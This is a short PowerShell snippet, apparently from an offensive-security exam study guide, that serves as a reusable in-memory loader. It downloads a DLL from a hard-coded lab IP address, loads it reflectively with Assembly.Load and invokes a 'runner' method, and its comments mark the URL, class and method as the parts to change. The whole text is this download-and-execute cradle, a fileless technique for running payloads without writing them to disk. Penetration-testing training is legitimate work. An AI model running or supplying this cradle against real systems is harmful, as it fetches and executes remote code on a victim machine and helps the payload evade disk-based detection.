#C# Project Refer to osep-survival-guide\csharp-to-js-payload\DotNetToJScript-master\ExampleAssembly

#Change URL
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll') 


$assem = [System.Reflection.Assembly]::Load($data)
#Change ClassName
$class = $assem.GetType("Class1")
#Change Method 
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)